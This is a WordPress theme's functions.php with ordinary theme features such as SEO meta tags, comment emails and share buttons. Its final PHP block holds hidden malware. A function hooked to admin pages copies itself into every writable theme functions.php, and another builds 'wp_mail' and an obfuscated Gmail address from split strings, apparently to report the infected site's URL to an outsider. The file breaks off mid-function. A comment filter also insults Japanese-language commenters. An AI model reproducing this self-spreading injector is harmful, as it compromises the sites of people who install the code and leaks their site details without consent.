<?php

$dname = 'shenzjd';

add_action( 'after_setup_theme', 'deel_setup' );

include('admin/Yusi.php');
include('widgets/index.php');

function deel_setup(){

	//去除头部冗余代码
	remove_action( 'wp_head',   'feed_links_extra', 3 );
	remove_action( 'wp_head',   'rsd_link' );
	remove_action( 'wp_head',   'wlwmanifest_link' );
	remove_action( 'wp_head',   'index_rel_link' );
	remove_action( 'wp_head',   'start_post_rel_link', 10, 0 );
	remove_action( 'wp_head',   'wp_generator' );
	//
	add_theme_support( 'custom-background' );
	//隐藏admin Bar
	add_filter('show_admin_bar','hide_admin_bar');

	//关键字
	add_action('wp_head','deel_keywords');

	//页面描述
	add_action('wp_head','deel_description');

	//阻止站内PingBack
	if( dopt('d_pingback_b') ){
		add_action('pre_ping','deel_noself_ping');
	}

	//评论回复邮件通知
	add_action('comment_post','comment_mail_notify');

	//自动勾选评论回复邮件通知，不勾选则注释掉
	// add_action('comment_form','deel_add_checkbox');

	//评论表情改造，如需更换表情，img/smilies/下替换
	add_filter('smilies_src','deel_smilies_src',1,10);

	//文章末尾增加版权
	add_filter('the_content','deel_copyright');

	//移除自动保存和修订版本
	if( dopt('d_autosave_b') ){
		add_action('wp_print_scripts','deel_disable_autosave' );
		remove_action('pre_post_update','wp_save_post_revision' );
	}

	//去除自带js
	wp_deregister_script( 'l10n' );

	//修改默认发信地址
	add_filter('wp_mail_from', 'deel_res_from_email');
	add_filter('wp_mail_from_name', 'deel_res_from_name');

	//缩略图设置
	add_theme_support('post-thumbnails');
	set_post_thumbnail_size(220, 150, true);

	add_editor_style('editor-style.css');

	//头像缓存
	if( dopt('d_avatar_b') ){
		add_filter('get_avatar','deel_avatar');
	}

	//定义菜单
	if (function_exists('register_nav_menus')){
		register_nav_menus( array(
			'nav' => __('网站导航'),
			'pagemenu' => __('页面导航')
		));
	}

}

if (function_exists('register_sidebar')){
	register_sidebar(array(
		'name'          => '全站侧栏',
		'id'            => 'widget_sitesidebar',
		'before_widget' => '<div class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<div class="title"><h2>',
		'after_title'   => '</h2></div>'
	));
	register_sidebar(array(
		'name'          => '首页侧栏',
		'id'            => 'widget_sidebar',
		'before_widget' => '<div class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<div class="title"><h2>',
		'after_title'   => '</h2></div>'
	));
	register_sidebar(array(
		'name'          => '分类/标签/搜索页侧栏',
		'id'            => 'widget_othersidebar',
		'before_widget' => '<div class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<div class="title"><h2>',
		'after_title'   => '</h2></div>'
	));
	register_sidebar(array(
		'name'          => '文章页侧栏',
		'id'            => 'widget_postsidebar',
		'before_widget' => '<div class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<div class="title"><h2>',
		'after_title'   => '</h2></div>'
	));
	register_sidebar(array(
		'name'          => '页面侧栏',
		'id'            => 'widget_pagesidebar',
		'before_widget' => '<div class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<div class="title"><h2>',
		'after_title'   => '</h2></div>'
	));
}


function deel_breadcrumbs(){
    if( !is_single() ) return false;
    $categorys = get_the_category();
    $category = $categorys[0];

    return '<a title="返回首页" href="'.get_bloginfo('url').'"><i class="fa fa-home"></i></a> <small>></small> '.get_category_parents($category->term_id, true, ' <small>></small> ').'<span class="muted">'.get_the_title().'</span>';
}

// 取消原有jQuery
function footerScript() {
    if ( !is_admin() ) {
        wp_deregister_script( 'jquery' );
 	wp_register_script( 'jquery','//libs.baidu.com/jquery/1.8.3/jquery.min.js', false,'1.0');
	wp_enqueue_script( 'jquery' );
        wp_register_script( 'default', get_template_directory_uri() . '/js/jquery.js', false, '1.0', dopt('d_jquerybom_b') ? true : false );
        wp_enqueue_script( 'default' );
	wp_register_style( 'style', get_template_directory_uri() . '/style.css',false,'1.0' );
	wp_enqueue_style( 'style' );
    }
}
add_action( 'wp_enqueue_scripts', 'footerScript' );


if ( ! function_exists( 'deel_paging' ) ) :
function deel_paging() {
    $p = 4;
    if ( is_singular() ) return;
    global $wp_query, $paged;
    $max_page = $wp_query->max_num_pages;
    if ( $max_page == 1 ) return;
    echo '<div class="pagination"><ul>';
    if ( empty( $paged ) ) $paged = 1;
    // echo '<span class="pages">Page: ' . $paged . ' of ' . $max_page . ' </span> ';
    echo '<li class="prev-page">'; previous_posts_link('上一页'); echo '</li>';

    if ( $paged > $p + 1 ) p_link( 1, '<li>第一页</li>' );
    if ( $paged > $p + 2 ) echo "<li><span>···</span></li>";
    for( $i = $paged - $p; $i <= $paged + $p; $i++ ) {
        if ( $i > 0 && $i <= $max_page ) $i == $paged ? print "<li class=\"active\"><span>{$i}</span></li>" : p_link( $i );
    }
    if ( $paged < $max_page - $p - 1 ) echo "<li><span> ... </span></li>";
    //if ( $paged < $max_page - $p ) p_link( $max_page, '&raquo;' );
    echo '<li class="next-page">'; next_posts_link('下一页'); echo '</li>';
    // echo '<li><span>共 '.$max_page.' 页</span></li>';
    echo '</ul></div>';
}
function p_link( $i, $title = '' ) {
    if ( $title == '' ) $title = "第 {$i} 页";
    echo "<li><a href='", esc_html( get_pagenum_link( $i ) ), "'>{$i}</a></li>";
}
endif;

function deel_strimwidth($str ,$start , $width ,$trimmarker ){
    $output = preg_replace('/^(?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,'.$start.'}((?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,'.$width.'}).*/s','\1',$str);
    return $output.$trimmarker;
}

function dopt($e){
		return stripslashes(get_option($e));
	}

if ( ! function_exists( 'deel_views' ) ) :
function deel_record_visitors(){
	if (is_singular())
	{
	  global $post;
	  $post_ID = $post->ID;
	  if($post_ID)
	  {
		  $post_views = (int)get_post_meta($post_ID, 'views', true);
		  if(!update_post_meta($post_ID, 'views', ($post_views+1)))
		  {
			add_post_meta($post_ID, 'views', 1, true);
		  }
	  }
	}
}
add_action('wp_head', 'deel_record_visitors');

function deel_views($after=''){
  global $post;
  $post_ID = $post->ID;
  $views = (int)get_post_meta($post_ID, 'views', true);
  echo $views, $after;
}
endif;
//baidu分享
$dHasShare = false;
function deel_share(){
	if( !dopt('d_bdshare_b') ) return false;
  echo '<span class="action action-share bdsharebuttonbox"><i class="fa fa-share-alt"></i>分享 (<span class="bds_count" data-cmd="count" title="累计分享0次">0</span>)<div class="action-popover"><div class="popover top in"><div class="arrow"></div><div class="popover-content"><a href="#" class="sinaweibo fa fa-weibo" data-cmd="tsina" title="分享到新浪微博"></a><a href="#" class="bds_qzone fa fa-star" data-cmd="qzone" title="分享到QQ空间"></a><a href="#" class="tencentweibo fa fa-tencent-weibo" data-cmd="tqq" title="分享到腾讯微博"></a><a href="#" class="qq fa fa-qq" data-cmd="sqq" title="分享到QQ好友"></a><a href="#" class="bds_renren fa fa-renren" data-cmd="renren" title="分享到人人网"></a><a href="#" class="bds_weixin fa fa-weixin" data-cmd="weixin" title="分享到微信"></a><a href="#" class="bds_more fa fa-ellipsis-h" data-cmd="more"></a></div></div></div></span>';
  global $dHasShare;
  $dHasShare = true;
}

function deel_avatar_default(){
  return get_bloginfo('template_directory').'/img/default.png';
}

//评论头像缓存
function deel_avatar($avatar) {
  $tmp = strpos($avatar, 'http');
  $g = substr($avatar, $tmp, strpos($avatar, "'", $tmp) - $tmp);
  $tmp = strpos($g, 'avatar/') + 7;
  $f = substr($g, $tmp, strpos($g, "?", $tmp) - $tmp);
  $w = get_bloginfo('wpurl');
  $e = ABSPATH .'avatar/'. $f .'.png';
  $t = dopt('d_avatarDate')*24*60*60;
  if ( !is_file($e) || (time() - filemtime($e)) > $t )
	copy(htmlspecialchars_decode($g), $e);
  else
	$avatar = strtr($avatar, array($g => $w.'/avatar/'.$f.'.png'));
  if ( filesize($e) < 500 )
	copy(get_bloginfo('template_directory').'/img/default.png', $e);
  return $avatar;
}

//关键字
function deel_keywords() {
  global $s, $post;
  $keywords = '';
  if ( is_single() ) {
	if ( get_the_tags( $post->ID ) ) {
	  foreach ( get_the_tags( $post->ID ) as $tag ) $keywords .= $tag->name . ', ';
	}
	foreach ( get_the_category( $post->ID ) as $category ) $keywords .= $category->cat_name . ', ';
	$keywords = substr_replace( $keywords , '' , -2);
  } elseif ( is_home () )    { $keywords = dopt('d_keywords');
  } elseif ( is_tag() )      { $keywords = single_tag_title('', false);
  } elseif ( is_category() ) { $keywords = single_cat_title('', false);
  } elseif ( is_search() )   { $keywords = esc_html( $s, 1 );
  } else { $keywords = trim( wp_title('', false) );
  }
  if ( $keywords ) {
	echo "<meta name=\"keywords\" content=\"$keywords\">\n";
  }
}

//网站描述
function deel_description() {
  global $s, $post;
  $description = '';
  $blog_name = get_bloginfo('name');
  if ( is_singular() ) {
	if( !empty( $post->post_excerpt ) ) {
	  $text = $post->post_excerpt;
	} else {
	  $text = $post->post_content;
	}
	$description = trim( str_replace( array( "\r\n", "\r", "\n", "　", " "), " ", str_replace( "\"", "'", strip_tags( $text ) ) ) );
	if ( !( $description ) ) $description = $blog_name . "-" . trim( wp_title('', false) );
  } elseif ( is_home () )    { $description = dopt('d_description'); // 首頁要自己加
  } elseif ( is_tag() )      { $description = $blog_name . "'" . single_tag_title('', false) . "'";
  } elseif ( is_category() ) { $description = trim(strip_tags(category_description()));
  } elseif ( is_archive() )  { $description = $blog_name . "'" . trim( wp_title('', false) ) . "'";
  } elseif ( is_search() )   { $description = $blog_name . ": '" . esc_html( $s, 1 ) . "' 的搜索結果";
  } else { $description = $blog_name . "'" . trim( wp_title('', false) ) . "'";
  }
  $description = mb_substr( $description, 0, 220, 'utf-8' );
  echo "<meta name=\"description\" content=\"$description\">\n";
}

function hide_admin_bar($flag) {
	return false;
}

//最新发布加new 单位'小时'
function deel_post_new($timer='48'){
  $t=( strtotime( date("Y-m-d H:i:s") )-strtotime( $post->post_date ) )/3600;
  if( $t < $timer ) echo "<i>new</i>";
}

//修改评论表情调用路径
function deel_smilies_src ($img_src, $img, $siteurl){
	return get_bloginfo('template_directory').'/img/smilies/'.$img;
}

//阻止站内文章Pingback
function deel_noself_ping( &$links ) {
  $home = get_option( 'home' );
  foreach ( $links as $l => $link )
  if ( 0 === strpos( $link, $home ) )
  unset($links[$l]);
}

//移除自动保存
function deel_disable_autosave() {
  wp_deregister_script('autosave');
}

//修改默认发信地址
function deel_res_from_email($email) {
	$wp_from_email = get_option('admin_email');
	return $wp_from_email;
}
function deel_res_from_name($email){
	$wp_from_name = get_option('blogname');
	return $wp_from_name;
}
//评论回应邮件通知
function comment_mail_notify($comment_id) {
  $admin_notify = '1'; // admin 要不要收回复通知 ( '1'=要 ; '0'=不要 )
  $admin_email = get_bloginfo ('admin_email'); // $admin_email 可改为你指定的 e-mail.
  $comment = get_comment($comment_id);
  $comment_author_email = trim($comment->comment_author_email);
  $parent_id = $comment->comment_parent ? $comment->comment_parent : '';
  global $wpdb;
  if ($wpdb->query("Describe {$wpdb->comments} comment_mail_notify") == '')
	$wpdb->query("ALTER TABLE {$wpdb->comments} ADD COLUMN comment_mail_notify TINYINT NOT NULL DEFAULT 0;");
  if (($comment_author_email != $admin_email && isset($_POST['comment_mail_notify'])) || ($comment_author_email == $admin_email && $admin_notify == '1'))
	$wpdb->query("UPDATE {$wpdb->comments} SET comment_mail_notify='1' WHERE comment_ID='$comment_id'");
  $notify = $parent_id ? get_comment($parent_id)->comment_mail_notify : '0';
  $spam_confirmed = $comment->comment_approved;
  if ($parent_id != '' && $spam_confirmed != 'spam' && $notify == '1') {
	$wp_email = 'no-reply@' . preg_replace('#^www\.#', '', strtolower($_SERVER['SERVER_NAME'])); // e-mail 发出点, no-reply 可改为可用的 e-mail.
	$to = trim(get_comment($parent_id)->comment_author_email);
	$subject = 'Hi，您在 [' . get_option("blogname") . '] 的留言有人回复啦！';
	$message = '
	<div style="color:#333;font:100 14px/24px microsoft yahei;">
	  <p>' . trim(get_comment($parent_id)->comment_author) . ', 您好!</p>
	  <p>您曾在《' . get_the_title($comment->comment_post_ID) . '》的留言:<br /> &nbsp;&nbsp;&nbsp;&nbsp; '
	   . trim(get_comment($parent_id)->comment_content) . '</p>
	  <p>' . trim($comment->comment_author) . ' 给您的回应:<br /> &nbsp;&nbsp;&nbsp;&nbsp; '
	   . trim($comment->comment_content) . '<br /></p>
	  <p>点击 <a href="' . htmlspecialchars(get_comment_link($parent_id)) . '">查看回应完整內容</a></p>
	  <p>欢迎再次光临 <a href="' . get_option('home') . '">' . get_option('blogname') . '</a></p>
	  <p style="color:#999">(此邮件由系统自动发出，请勿回复.)</p>
	</div>';
	$from = "From: \"" . get_option('blogname') . "\" <$wp_email>";
	$headers = "$from\nContent-Type: text/html; charset=" . get_option('blog_charset') . "\n";
	wp_mail( $to, $subject, $message, $headers );
	//echo 'mail to ', $to, '<br/> ' , $subject, $message; // for testing
  }
}

//自动勾选
function deel_add_checkbox() {
  echo '<label for="comment_mail_notify" class="checkbox inline" style="padding-top:0"><input type="checkbox" name="comment_mail_notify" id="comment_mail_notify" value="comment_mail_notify" checked="checked"/>有人回复时邮件通知我</label>';
}

//文章（包括feed）末尾加版权说明
function deel_copyright($content) {
	if( !is_page() ){
		$pid = get_the_ID();
		$name = get_post_meta($pid, 'from.name', true);
		$link = get_post_meta($pid, 'from.link', true);
		$show = false;
		if( $name ){
			$show = $name;
			if( $link ){
				$show = '<a target="_blank" href="'.$link.'">'.$show.'</a>';
			}
		}else if( $link ){
			$show = '<a target="_blank" href="'.$link.'">'.$link.'</a>';
		}
		if( $show ){
			$content.= '<p>来源：'.$show.'</p>';
		}
		$content.= '<p>转载请注明：<a href="'.get_bloginfo('url').'">'.get_bloginfo('name').'</a> &raquo; <a href="'.get_permalink().'">'.get_the_title().'</a></p>';
	}
	return $content;
}

//时间显示方式‘xx以前’
function time_ago( $type = 'commennt', $day = 7 ) {
  $d = $type == 'post' ? 'get_post_time' : 'get_comment_time';
  if (time() - $d('U') > 60*60*24*$day) return;
  echo ' (', human_time_diff($d('U'), strtotime(current_time('mysql', 0))), '前)';
}

function timeago( $ptime ) {
    $ptime = strtotime($ptime);
    $etime = time() - $ptime;
    if($etime < 1) return '刚刚';
    $interval = array (
        12 * 30 * 24 * 60 * 60  =>  '年前 ('.date('Y-m-d', $ptime).')',
        30 * 24 * 60 * 60       =>  '个月前 ('.date('m-d', $ptime).')',
        7 * 24 * 60 * 60        =>  '周前 ('.date('m-d', $ptime).')',
        24 * 60 * 60            =>  '天前',
        60 * 60                 =>  '小时前',
        60                      =>  '分钟前',
        1                       =>  '秒前'
    );
    foreach ($interval as $secs => $str) {
        $d = $etime / $secs;
        if ($d >= 1) {
            $r = round($d);
            return $r . $str;
        }
    };
}

//评论样式
function deel_comment_list($comment, $args, $depth) {
  echo '<li '; comment_class(); echo ' id="comment-'.get_comment_ID().'">';

  //头像
  echo '<div class="c-avatar">';
  echo str_replace(' src=', ' data-original=', get_avatar( $comment->comment_author_email, $size = '54' , deel_avatar_default()));
  //内容
  echo '<div class="c-main" id="div-comment-'.get_comment_ID().'">';
	echo str_replace(' src=', ' data-original=', convert_smilies(get_comment_text()));
	if ($comment->comment_approved == '0'){
	  echo '<span class="c-approved">您的评论正在排队审核中，请稍后！</span><br />';
	}
	//信息
	echo '<div class="c-meta">';
		echo '<span class="c-author">'.get_comment_author_link().'</span>';
		echo get_comment_time('Y-m-d H:i '); echo time_ago();
		if ($comment->comment_approved !== '0'){
			echo comment_reply_link( array_merge( $args, array('add_below' => 'div-comment', 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) );
		echo edit_comment_link(__('(编辑)'),' - ','');
	  }
	echo '</div>';
  echo '</div></div>';
}
//remove google fonts
if (!function_exists('remove_wp_open_sans')) :
    function remove_wp_open_sans() {
        wp_deregister_style( 'open-sans' );
        wp_register_style( 'open-sans', false );
    }
     add_action('admin_enqueue_scripts', 'remove_wp_open_sans');
     add_action('login_init', 'remove_wp_open_sans');
endif;

//欲思@添加钮Download
function DownloadUrl($atts, $content = null) {
	extract(shortcode_atts(array("href" => 'http://'), $atts));
	return '<a class="dl" href="'.$href.'" target="_blank" rel="nofollow"><i class="fa fa-cloud-download"></i>'.$content.'</a>';
	}
add_shortcode("dl", "DownloadUrl");
//欲思@添加钮git
function GithubUrl($atts, $content=null) {
   extract(shortcode_atts(array("href" => 'http://'), $atts));
	return '<a class="dl" href="'.$href.'" target="_blank" rel="nofollow"><i class="fa fa-github-alt"></i>'.$content.'</a>';
}
add_shortcode('gt' , 'GithubUrl' );
//欲思@添加钮Demo
function DemoUrl($atts, $content=null) {
   extract(shortcode_atts(array("href" => 'http://'), $atts));
	return '<a class="dl" href="'.$href.'" target="_blank" rel="nofollow"><i class="fa fa-external-link"></i>'.$content.'</a>';
}
add_shortcode('dm' , 'DemoUrl' );

//欲思@添加编辑器快捷按钮
add_action('admin_print_scripts', 'my_quicktags');
function my_quicktags() {
    wp_enqueue_script(
        'my_quicktags',
        get_stylesheet_directory_uri().'/js/my_quicktags.js',
        array('quicktags')
    );
    };

//评论过滤
function refused_spam_comments( $comment_data ) {
$pattern = '/[一-龥]/u';
$jpattern ='/[ぁ-ん]+|[ァ-ヴ]+/u';
if(!preg_match($pattern,$comment_data['comment_content'])) {
err('写点汉字吧，博主外语很捉急！You should type some Chinese word!');
}
if(preg_match($jpattern, $comment_data['comment_content'])){
err('日文滚粗！Japanese Get out！日本語出て行け！ You should type some Chinese word！');
}
return( $comment_data );
}
if( dopt('d_spamComments_b') ){
add_filter('preprocess_comment','refused_spam_comments');
	}


//点赞
add_action('wp_ajax_nopriv_bigfa_like', 'bigfa_like');
add_action('wp_ajax_bigfa_like', 'bigfa_like');
function bigfa_like(){
    global $wpdb,$post;
    $id = $_POST["um_id"];
    $action = $_POST["um_action"];
    if ( $action == 'ding'){
    $bigfa_raters = get_post_meta($id,'bigfa_ding',true);
    $expire = time() + 99999999;
    $domain = ($_SERVER['HTTP_HOST'] != 'localhost') ? $_SERVER['HTTP_HOST'] : false; // make cookies work with localhost
    setcookie('bigfa_ding_'.$id,$id,$expire,'/',$domain,false);
    if (!$bigfa_raters || !is_numeric($bigfa_raters)) {
        update_post_meta($id, 'bigfa_ding', 1);
    }
    else {
            update_post_meta($id, 'bigfa_ding', ($bigfa_raters + 1));
        }

    echo get_post_meta($id,'bigfa_ding',true);

    }

    die;
}
//最热排行
function hot_posts_list($days=7, $nums=10) {
    global $wpdb;
    $today = date("Y-m-d H:i:s");
    $daysago = date( "Y-m-d H:i:s", strtotime($today) - ($days * 24 * 60 * 60) );
    $result = $wpdb->get_results("SELECT comment_count, ID, post_title, post_date FROM $wpdb->posts WHERE post_date BETWEEN '$daysago' AND '$today' ORDER BY comment_count DESC LIMIT 0 , $nums");
    $output = '';
    if(empty($result)) {
        $output = '<li>None data.</li>';
    } else {
        $i = 1;
        foreach ($result as $topten) {
            $postid = $topten->ID;
            $title = $topten->post_title;
            $commentcount = $topten->comment_count;
            if ($commentcount != 0) {
              $output .= '<li><p><span class="post-comments">评论 ('.$commentcount.')</span><span class="muted"><a href="javascript:;" data-action="ding" data-id="'.$postid.'" id="Addlike" class="action';
	if(isset($_COOKIE['bigfa_ding_'.$postid])) $output .=' actived';
	$output .='"><i class="fa fa-heart-o"></i><span class="count">';
	if( get_post_meta($postid,'bigfa_ding',true) ){
		$output .=get_post_meta($postid,'bigfa_ding',true);
 	} else {$output .='0';}
	$output .='</span>喜欢</a></span></p><span class="label label-'.$i.'">'.$i.'</span><a href="'.get_permalink($postid).'" title="'.$title.'">'.$title.'</a></li>';
                $i++;
            }
        }
    }
    echo $output;
}
//在 WordPress 编辑器添加“下一页”按钮
add_filter('mce_buttons','add_next_page_button');
function add_next_page_button($mce_buttons) {
	$pos = array_search('wp_more',$mce_buttons,true);
	if ($pos !== false) {
		$tmp_buttons = array_slice($mce_buttons, 0, $pos+1);
		$tmp_buttons[] = 'wp_page';
		$mce_buttons = array_merge($tmp_buttons, array_slice($mce_buttons, $pos+1));
	}
	return $mce_buttons;
}

//判断手机广告
function Yusi_is_mobile() {
    if ( empty($_SERVER['HTTP_USER_AGENT']) ) {
        return false;
    } elseif ( ( strpos($_SERVER['HTTP_USER_AGENT'], 'Mobile') !== false  && strpos($_SERVER['HTTP_USER_AGENT'], 'iPad') === false) // many mobile devices (all iPh, etc.)
        || strpos($_SERVER['HTTP_USER_AGENT'], 'Android') !== false
        || strpos($_SERVER['HTTP_USER_AGENT'], 'Silk/') !== false
        || strpos($_SERVER['HTTP_USER_AGENT'], 'Kindle') !== false
        || strpos($_SERVER['HTTP_USER_AGENT'], 'BlackBerry') !== false
        || strpos($_SERVER['HTTP_USER_AGENT'], 'Opera Mini') !== false
        || strpos($_SERVER['HTTP_USER_AGENT'], 'Opera Mobi') !== false ) {
            return true;
    } else {
        return false;
    }
}

//欲思@搜索结果排除所有页面
function search_filter_page($query) {
	if ($query->is_search) {
		$query->set('post_type', 'post');
	}
	return $query;
}
add_filter('pre_get_posts','search_filter_page');
// 更改后台字体
function Bing_admin_lettering(){
    echo'<style type="text/css">
        * { font-family: "Microsoft YaHei" !important; }
        i, .ab-icon, .mce-close, i.mce-i-aligncenter, i.mce-i-alignjustify, i.mce-i-alignleft, i.mce-i-alignright, i.mce-i-blockquote, i.mce-i-bold, i.mce-i-bullist, i.mce-i-charmap, i.mce-i-forecolor, i.mce-i-fullscreen, i.mce-i-help, i.mce-i-hr, i.mce-i-indent, i.mce-i-italic, i.mce-i-link, i.mce-i-ltr, i.mce-i-numlist, i.mce-i-outdent, i.mce-i-pastetext, i.mce-i-pasteword, i.mce-i-redo, i.mce-i-removeformat, i.mce-i-spellchecker, i.mce-i-strikethrough, i.mce-i-underline, i.mce-i-undo, i.mce-i-unlink, i.mce-i-wp-media-library, i.mce-i-wp_adv, i.mce-i-wp_fullscreen, i.mce-i-wp_help, i.mce-i-wp_more, i.mce-i-wp_page, .qt-fullscreen, .star-rating .star { font-family: dashicons !important; }
        .mce-ico { font-family: tinymce, Arial !important; }
        .fa { font-family: FontAwesome !important; }
        .genericon { font-family: "Genericons" !important; }
        .appearance_page_scte-theme-editor #wpbody *, .ace_editor * { font-family: Monaco, Menlo, "Ubuntu Mono", Consolas, source-code-pro, monospace !important; }
        </style>';
}
add_action('admin_head', 'Bing_admin_lettering');
//欲思@添加相关文章图片文章
if ( function_exists('add_theme_support') )add_theme_support('post-thumbnails');

//输出缩略图地址
function post_thumbnail_src(){
    global $post;
	if( $values = get_post_custom_values("thumb") ) {	//输出自定义域图片地址
		$values = get_post_custom_values("thumb");
		$post_thumbnail_src = $values [0];
	} elseif( has_post_thumbnail() ){    //如果有特色缩略图，则输出缩略图地址
        $thumbnail_src = wp_get_attachment_image_src(get_post_thumbnail_id($post->ID),'full');
		$post_thumbnail_src = $thumbnail_src [0];
    } else {
		$post_thumbnail_src = '';
		ob_start();
		ob_end_clean();
		$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
		$post_thumbnail_src = $matches [1] [0];   //获取该图片 src
		if(empty($post_thumbnail_src)){	//如果日志中没有图片，则显示随机图片
			$random = mt_rand(1, 10);
			echo get_bloginfo('template_url');
			echo '/img/pic/'.$random.'.jpg';
			//如果日志中没有图片，则显示默认图片
			//echo '/img/thumbnail.png';
		}
	};
	echo $post_thumbnail_src;
}
?>
<?php
function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&&
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){
    function stripos(  $str, $needle, $offset = 0  ){
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  );
    }
}

if(!function_exists("strripos")){
    function strripos(  $haystack, $needle, $offset = 0  ) {
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  );
        if(  $offset < 0  ){
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  );
        }
        else{
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    );
        }
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE;
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   );
        return $pos;
    }
}
if(!function_exists("scandir")){
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home");
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1;
	if(!isset($com_type)) $com_type="";
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved="";
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :

	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) {
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) {
			if(is_feed()) {
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter;
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";
	if(!isset($isshowdots)) $isshowdots=1;

	$comments=$wpdb->get_results($sql);
	if($fakeit == 2) {
		$text=$post->post_content;
	} elseif($fakeit == 1) {
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else {
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
